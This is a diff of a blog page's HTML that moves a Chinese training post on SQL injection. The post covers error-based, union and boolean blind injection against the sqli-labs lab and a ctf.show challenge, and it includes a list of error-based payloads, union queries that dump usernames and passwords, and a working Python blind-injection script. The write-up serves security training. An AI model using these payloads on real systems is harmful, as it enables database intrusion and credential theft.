@@ -262,6 +262,69 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-培训笔记21" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/12/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/" class="article-date">
+      <time datetime="2023-12-25T02:13:04.000Z" itemprop="datePublished">2023-12-25</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/25/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/">SQL注入之盲注型,报错型，postman软件的使用</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="SQL数字型注入"><a href="#SQL数字型注入" class="headerlink" title="SQL数字型注入"></a>SQL数字型注入</h2><p>1.打开虚拟机win10hei的phpstudy,开启Apache和Mysql，使用php5.5.9,打开网站，点击sqli,点击下图圈内的数据，初始化数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163695294-5a64ff5b-77a0-4b29-8675-4a840803c65b.png" alt="image.png"><br>2.进入第二关，按键盘的F12,点击HackBar,输入<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-2/?id=1">http://192.168.17.128/sqli/Less-2/?id=1</a>，没报错，我们要找的是报错点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163939662-a60b000d-b674-43cd-b548-dce59af2a3b4.png" alt="image.png"><br>3.查看第二关的代码，发现这关的解法是数字型注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164370988-148029f7-d7ef-4e36-9e3c-6157fb4e515e.png" alt="image.png"><br>4.id&#x3D;1 后面加 order by 4,发现字段没有四列，所以一般是3列。开始查表。和之前的一样的套路，union联合注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164620139-6071a896-7eac-4fef-966e-6a004057d5a6.png" alt="image.png"><br>5.查字段名<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164753618-29682902-5766-431f-9374-9cc5c40f5cdd.png" alt="image.png"><br>6.查字段，得到我们想要的结果<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164848325-261c35f6-89c1-4224-a04a-35ece6a05ef5.png" alt="image.png"><br>7.十种常见的SQL报错函数  （注意：函数前用and连接）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))-- -</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))-- -</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))-- -</span><br></pre></td></tr></table></figure>
+
+<h2 id="postman软件的使用"><a href="#postman软件的使用" class="headerlink" title="postman软件的使用"></a>postman软件的使用</h2><p>1.在虚拟机win10hei的火狐浏览器访问老师给的ctf show题目链接：<a target="_blank" rel="noopener" href="http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/">http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703250565862-28b7bbad-59cc-49ef-acbd-724e469485b7.png" alt="image.png"><br>2.键入F12，点击网络，点击重新加载，找到API，即名字为v3.php?page&#x3D;1&amp;limit&#x3D;10的文件，复制右边栏GET请求的网址，粘贴到postman的发包框内<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248669523-c7c4f1be-66ab-4b58-96d1-46d603fb61d8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248850495-d7e11cf9-0571-4085-9798-f28921ab0d03.png" alt="image.png"><br>3.发送请求方式选择GET,在表格第三行输入id和1，点击send,查询到了id&#x3D;1的用户名和密码。然后找闭合点，在1的后面加单引号，再点击send,发现底栏报错，说明1’是闭合点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249314650-9f381305-de9f-4f30-a489-2b56eac6392c.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/40675946/1703249614803-476ebe29-f994-4f6a-a167-2303e0b9fdb0.png#averageHue=%23fcfcfc&clientId=u644166bb-afff-4&from=paste&height=371&id=u7bb98b60&originHeight=371&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22993&status=done&style=none&taskId=u75ea20b7-cc28-4cd3-8b25-a4ec0a20862&title=&width=904" alt="image.png"><br>4.1’的后面加order by 4 – -判断数据表是否有4列，结果报错，改成order by 3 – -，可以显示数据，说明只有3列<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249919426-3163c3ca-214a-4385-9ba4-d2896a3a1f18.png" alt="image.png"><br>5.查字段名，把1改成-1，在表格1’后面使用union联合sql语句,和之前的报错型的步骤基本相同<br><code>-1&#39; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;ctfshow_user3&#39; and table_schema=database();-- -</code><br>6.查字段，在表格1’后面使用union联合sql语句。<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br>因为我们要得到的是username&#x3D;’flag’的密码，所以要删除username,最终为<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251101346-9141a6ac-450d-43e9-aab9-c71acea03323.png" alt="image.png"></p>
+<h2 id="SQL注入之盲注型，布尔"><a href="#SQL注入之盲注型，布尔" class="headerlink" title="SQL注入之盲注型，布尔"></a>SQL注入之盲注型，布尔</h2><p>1.SQL注入理论<br>（1）SQL注入的含义:SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。<br>（2）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168115226-4b84b8d3-1f5f-4290-a0f9-74e0af769592.png" alt="Image.png"><br>（3）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168181264-adbd4c70-64ff-45ed-89b6-ac32390792f9.png" alt="Image.png"><br>（4）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168241171-bb34d4fe-cb99-49d7-a738-c5c391a116af.png" alt="Image.png"><br>（5）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168291828-ac2d160c-5077-4f3f-8fb8-dc62fda8e7f1.png" alt="Image.png"><br>（6）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168324049-4b6009f0-0bb3-4989-ade2-120b1de01cd6.png" alt="Image.png"><br>2.<code>id=1&#39;and ascii(substring(database(),1,1))=115--+</code>,根据提供的语句，以sqli的第6关为例，编写一个SQL盲注的python脚本并运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.17.128/sqli/Less-6/?id=1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db():</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        begin = 32</span><br><span class="line">        end = 128</span><br><span class="line">        tmp = (begin + end) // 2</span><br><span class="line">        while begin &lt; end:</span><br><span class="line">            paramsGet = url + &quot;/**/and/**/ascii(substring((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(</span><br><span class="line">                i, tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">                begin = tmp + 1</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">            else:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">        if tmp == 32:</span><br><span class="line">            break</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分析如下：<br>（1）import requests：导入 requests 模块，用于发送 HTTP 请求。<br>（2）session &#x3D; requests.session()：创建一个 requests 会话（session）对象。<br>（3）url &#x3D; ‘<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-6/?id=1%22%27%EF%BC%9A%E8%AE%BE%E7%BD%AE%E7%9B%AE%E6%A0%87">http://192.168.17.128/sqli/Less-6/?id=1&quot;&#39;：设置目标</a> URL，其中 id 参数的值为 1”，这里是一个潜在的注入点。<br>（4）利用名为 db 的函数，从数据库中逐个获取字符来构建字符串。代码通过二分法逐个猜测每个字符的 ASCII 值，并通过注入的操作获取其中的数据。<br>3.得到我们想要的字段。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251885180-214f4be2-1d1f-4ff3-bf33-650e81b2cd4c.png" alt="image.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-培训笔记22" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -301,69 +364,6 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch</span><br><span class="line">增加等级与风险：  python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch --level=<span class="number">5</span> --risk=<span class="number">3</span></span><br></pre></td></tr></table></figure>
 
 <p>此时爆出数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703348000344-f1b633df-d235-48ea-aa19-c5b37be8ef63.png" alt="image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-培训笔记21" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/" class="article-date">
-      <time datetime="2023-12-23T14:38:45.000Z" itemprop="datePublished">2023-12-23</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/">SQL注入之盲注型,报错型，postman软件的使用</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="SQL数字型注入"><a href="#SQL数字型注入" class="headerlink" title="SQL数字型注入"></a>SQL数字型注入</h2><p>1.打开虚拟机win10hei的phpstudy,开启Apache和Mysql，使用php5.5.9,打开网站，点击sqli,点击下图圈内的数据，初始化数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163695294-5a64ff5b-77a0-4b29-8675-4a840803c65b.png" alt="image.png"><br>2.进入第二关，按键盘的F12,点击HackBar,输入<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-2/?id=1">http://192.168.17.128/sqli/Less-2/?id=1</a>，没报错，我们要找的是报错点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163939662-a60b000d-b674-43cd-b548-dce59af2a3b4.png" alt="image.png"><br>3.查看第二关的代码，发现这关的解法是数字型注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164370988-148029f7-d7ef-4e36-9e3c-6157fb4e515e.png" alt="image.png"><br>4.id&#x3D;1 后面加 order by 4,发现字段没有四列，所以一般是3列。开始查表。和之前的一样的套路，union联合注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164620139-6071a896-7eac-4fef-966e-6a004057d5a6.png" alt="image.png"><br>5.查字段名<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164753618-29682902-5766-431f-9374-9cc5c40f5cdd.png" alt="image.png"><br>6.查字段，得到我们想要的结果<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164848325-261c35f6-89c1-4224-a04a-35ece6a05ef5.png" alt="image.png"><br>7.十种常见的SQL报错函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
-
-<h2 id="postman软件的使用"><a href="#postman软件的使用" class="headerlink" title="postman软件的使用"></a>postman软件的使用</h2><p>1.在虚拟机win10hei的火狐浏览器访问老师给的ctf show题目链接：<a target="_blank" rel="noopener" href="http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/">http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703250565862-28b7bbad-59cc-49ef-acbd-724e469485b7.png" alt="image.png"><br>2.键入F12，点击网络，点击重新加载，找到API，即名字为v3.php?page&#x3D;1&amp;limit&#x3D;10的文件，复制右边栏GET请求的网址，粘贴到postman的发包框内<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248669523-c7c4f1be-66ab-4b58-96d1-46d603fb61d8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248850495-d7e11cf9-0571-4085-9798-f28921ab0d03.png" alt="image.png"><br>3.发送请求方式选择GET,在表格第三行输入id和1，点击send,查询到了id&#x3D;1的用户名和密码。然后找闭合点，在1的后面加单引号，再点击send,发现底栏报错，说明1’是闭合点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249314650-9f381305-de9f-4f30-a489-2b56eac6392c.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249614803-476ebe29-f994-4f6a-a167-2303e0b9fdb0.png" alt="image.png"><br>4.1’的后面加order by 4 – -判断数据表是否有4列，结果报错，改成order by 3 – -，可以显示数据，说明只有3列<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249919426-3163c3ca-214a-4385-9ba4-d2896a3a1f18.png" alt="image.png"><br>5.查字段名，把1改成-1，在表格1’后面使用union联合sql语句,和之前的报错型的步骤基本相同<br><code>-1&#39; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;ctfshow_user3&#39; and table_schema=database();-- -</code><br>6.查字段，在表格1’后面使用union联合sql语句。<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br>因为我们要得到的是username&#x3D;’flag’的密码，所以要删除username,最终为<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251101346-9141a6ac-450d-43e9-aab9-c71acea03323.png" alt="image.png"></p>
-<h2 id="SQL注入之盲注型，布尔"><a href="#SQL注入之盲注型，布尔" class="headerlink" title="SQL注入之盲注型，布尔"></a>SQL注入之盲注型，布尔</h2><p>1.SQL注入理论<br>（1）SQL注入的含义:SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。<br>（2）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168115226-4b84b8d3-1f5f-4290-a0f9-74e0af769592.png" alt="Image.png"><br>（3）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168181264-adbd4c70-64ff-45ed-89b6-ac32390792f9.png" alt="Image.png"><br>（4）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168241171-bb34d4fe-cb99-49d7-a738-c5c391a116af.png" alt="Image.png"><br>（5）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168291828-ac2d160c-5077-4f3f-8fb8-dc62fda8e7f1.png" alt="Image.png"><br>（6）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168324049-4b6009f0-0bb3-4989-ade2-120b1de01cd6.png" alt="Image.png"><br>2.<code>id=1&#39;and ascii(substring(database(),1,1))=115--+</code>,根据提供的语句，以sqli的第6关为例，编写一个SQL盲注的python脚本并运行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.17.128/sqli/Less-6/?id=1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db():</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        begin = 32</span><br><span class="line">        end = 128</span><br><span class="line">        tmp = (begin + end) // 2</span><br><span class="line">        while begin &lt; end:</span><br><span class="line">            paramsGet = url + &quot;/**/and/**/ascii(substring((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(</span><br><span class="line">                i, tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">                begin = tmp + 1</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">            else:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">        if tmp == 32:</span><br><span class="line">            break</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>分析如下：<br>（1）import requests：导入 requests 模块，用于发送 HTTP 请求。<br>（2）session &#x3D; requests.session()：创建一个 requests 会话（session）对象。<br>（3）url &#x3D; ‘<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-6/?id=1%22%27%EF%BC%9A%E8%AE%BE%E7%BD%AE%E7%9B%AE%E6%A0%87">http://192.168.17.128/sqli/Less-6/?id=1&quot;&#39;：设置目标</a> URL，其中 id 参数的值为 1”，这里是一个潜在的注入点。<br>（4）利用名为 db 的函数，从数据库中逐个获取字符来构建字符串。代码通过二分法逐个猜测每个字符的 ASCII 值，并通过注入的操作获取其中的数据。<br>3.得到我们想要的字段。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251885180-214f4be2-1d1f-4ff3-bf33-650e81b2cd4c.png" alt="image.png"></p>
 
       
     </div>
